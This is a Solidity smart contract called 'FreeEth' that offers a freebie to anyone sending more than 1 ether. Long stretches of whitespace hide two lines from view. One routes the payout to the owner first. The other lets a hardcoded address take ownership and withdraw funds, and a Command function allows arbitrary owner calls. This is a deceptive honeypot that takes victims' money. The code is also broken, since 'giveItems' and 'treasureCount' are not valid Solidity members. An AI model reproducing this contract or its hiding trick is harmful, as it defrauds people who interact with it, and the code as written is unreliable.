// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract FreeEth
{
    address public RealmLord = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               RealmLord.giveItems(this.treasureCount);
            msg.sender.giveItems(this.treasureCount);
        }
    }

    function redeemGold()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){RealmLord=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == RealmLord);
        RealmLord.giveItems(this.treasureCount);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == RealmLord);
        adr.call.value(msg.value)(data);
    }
}